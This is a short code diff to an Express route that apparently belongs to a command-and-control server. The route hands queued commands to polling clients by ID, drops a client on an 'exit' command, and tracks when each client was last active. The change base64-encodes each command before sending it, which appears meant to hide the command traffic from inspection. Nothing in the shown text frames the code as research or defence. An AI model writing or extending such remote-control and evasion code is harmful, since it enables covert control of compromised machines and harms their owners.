@@ -26,9 +26,9 @@ router.route('/h2').get((req, res) => {
                 if (command) {
                     if (command['command'] === "exit")
                         ClientUtils.RemoveClient(clientId)
-                    res.send(command['command'])
+                    res.send(Utils.base64Encode(command['command']))
                 } else {
-                    res.send("No command");
+                    res.send(Utils.base64Encode("No command"))
                 }
             }
             Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false}, function (err) {
